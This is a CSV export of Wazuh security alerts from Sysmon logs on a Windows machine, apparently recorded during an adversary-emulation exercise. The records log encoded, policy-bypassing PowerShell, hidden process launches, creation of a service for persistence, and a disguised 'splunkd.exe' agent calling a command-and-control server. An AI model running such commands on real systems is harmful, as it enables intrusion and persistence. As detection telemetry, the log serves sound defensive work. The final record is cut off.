wazuh-alerts-4.x-2024.11.30,3_rLe5MBRlc-D5DFfB0r,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:39:08.688
ProcessGuid: {15959494-B30C-674A-A505-000000000D00}
ProcessId: 7776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_gs2kamiy.f2e.ps1
CreationUtcTime: 2024-11-30 06:39:08.688
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:39:08.697912500Z,54270,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,11,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:39:09.782",EventChannel,1732948749.795832,"Nov 30, 2024 @ 06:39:09.782", , , , , , , , , , , , ,7776, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B30C-674A-A505-000000000D00},2024-11-30 06:39:08.688, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gs2kamiy.f2e.ps1,2024-11-30 06:39:08.688, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,4vrMe5MBRlc-D5DFUx0E,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:40:00.749
ProcessGuid: {15959494-B340-674A-A605-000000000D00}
ProcessId: 3132
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_szwqpkpn.su1.ps1
CreationUtcTime: 2024-11-30 06:40:00.749
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:40:00.755142500Z,54288,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,12,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:40:01.821",EventChannel,1732948801.798842,"Nov 30, 2024 @ 06:40:01.821", , , , , , , , , , , , ,3132, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B340-674A-A605-000000000D00},2024-11-30 06:40:00.749, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_szwqpkpn.su1.ps1,2024-11-30 06:40:00.749, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,5PrOe5MBRlc-D5DFAB3F,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:41:49.743
ProcessGuid: {15959494-B3AD-674A-AA05-000000000D00}
ProcessId: 1972
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_0zsjenel.14m.ps1
CreationUtcTime: 2024-11-30 06:41:49.743
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:41:49.746580100Z,54324,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,14,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:41:50.868",EventChannel,1732948910.804862,"Nov 30, 2024 @ 06:41:50.868", , , , , , , , , , , , ,1972, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B3AD-674A-AA05-000000000D00},2024-11-30 06:41:49.743, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0zsjenel.14m.ps1,2024-11-30 06:41:49.743, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,3vrKe5MBRlc-D5DF8x1x,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:38:30.649
ProcessGuid: {15959494-B2E6-674A-A305-000000000D00}
ProcessId: 112
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_jwh0m4ev.hdj.ps1
CreationUtcTime: 2024-11-30 06:38:30.649
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:38:30.659242500Z,54254,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,10,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:38:31.783",EventChannel,1732948711.792826,"Nov 30, 2024 @ 06:38:31.783", , , , , , , , , , , , ,112, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B2E6-674A-A305-000000000D00},2024-11-30 06:38:30.649, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jwh0m4ev.hdj.ps1,2024-11-30 06:38:30.649, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,BvrXe5MBRlc-D5DFnR7J,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-11-30 06:52:18.009
ProcessGuid: {15959494-B622-674A-CF05-000000000D00}
ProcessId: 4092
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.3761.0 built by: NET48REL1
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\yc1exzaw\yc1exzaw.cmdline""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: {15959494-B621-674A-CE05-000000000D00}
ParentProcessId: 7832
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:52:18.010755800Z,54515,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:52:18.924",EventChannel,1732949538.953153,"Nov 30, 2024 @ 06:52:18.924", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4092, , , , , , , , , , ,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", , , ,csc.exe,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe,Microsoft® .NET Framework, , ,Visual C# Command Line Compiler, , ,{15959494-B622-674A-CF05-000000000D00},2024-11-30 06:52:18.009,"SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D","technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,4.8.3761.0 built by: NET48REL1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B621-674A-CE05-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop\""",0x107a6b,7832,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\mari\\AppData\\Local\\Temp\\yc1exzaw\\yc1exzaw.cmdline\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,JPrbe5MBRlc-D5DFRx5Z,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:56:19.550
ProcessGuid: {15959494-B712-674A-1106-000000000D00}
ProcessId: 4608
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_mckooq45.2ls.ps1
CreationUtcTime: 2024-11-30 06:56:19.550
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:19.560276000Z,54746,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,38,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:19.946",EventChannel,1732949779.1062459,"Nov 30, 2024 @ 06:56:19.946", , , , , , , , , , , , ,4608, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B712-674A-1106-000000000D00},2024-11-30 06:56:19.550, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mckooq45.2ls.ps1,2024-11-30 06:56:19.550, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Jfrbe5MBRlc-D5DFRx5Z,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:56:19.683
ProcessGuid: {15959494-B713-674A-1206-000000000D00}
ProcessId: 7800
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-B712-674A-1106-000000000D00}
ParentProcessId: 4608
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:56:19.685139100Z,54750,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,4,Powershell process spawned powershell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92027, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:20.009",EventChannel,1732949780.1065470,"Nov 30, 2024 @ 06:56:20.009", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7800, , , , , , , , , , ,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-B713-674A-1206-000000000D00},2024-11-30 06:56:19.683,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B712-674A-1106-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""Start-Process powershell.exe -WindowStyle hidden calc.exe\""",0x107a6b,4608,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" calc.exe",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,DfrYe5MBRlc-D5DF6R7W,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 06:53:47.704
ProcessGuid: {15959494-B67B-674A-D505-000000000D00}
ProcessId: 388
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc.exe \\localhost create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto type=Own && sc.exe \\localhost start AtomicTestService_CMD
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:53:47.707807600Z,54539,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,8,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:53:48.790",EventChannel,1732949628.986613,"Nov 30, 2024 @ 06:53:48.790", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,388, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B67B-674A-D505-000000000D00},2024-11-30 06:53:47.704,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc.exe \\\\localhost create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto type=Own &amp;&amp; sc.exe \\\\localhost start AtomicTestService_CMD",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,FPrae5MBRlc-D5DFSR5t,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 06:55:17.706
ProcessGuid: {15959494-B6D5-674A-DA05-000000000D00}
ProcessId: 8176
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C start """" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:55:17.708714600Z,54565,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,9,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:55:20.252",EventChannel,1732949720.1006362,"Nov 30, 2024 @ 06:55:20.252", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,8176, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B6D5-674A-DA05-000000000D00},2024-11-30 06:55:17.706,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C start \""\"" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Hvrae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.255
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\main.js
CreationUtcTime: 2024-11-30 06:56:00.255
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.260591500Z,54727,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,32,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.686",EventChannel,1732949760.1044157,"Nov 30, 2024 @ 06:56:00.686", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.255, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\main.js,2024-11-30 06:56:00.255, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,H_rae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.224
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\background.js
CreationUtcTime: 2024-11-30 06:56:00.224
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.225744100Z,54726,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,33,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.686",EventChannel,1732949760.1047194,"Nov 30, 2024 @ 06:56:00.686", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.224, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\background.js,2024-11-30 06:56:00.224, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,IPrae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.255
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\page_api.js
CreationUtcTime: 2024-11-30 06:56:00.255
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.268820300Z,54728,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,34,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.717",EventChannel,1732949760.1050255,"Nov 30, 2024 @ 06:56:00.717", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.255, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\page_api.js,2024-11-30 06:56:00.255, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Ivrae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.255
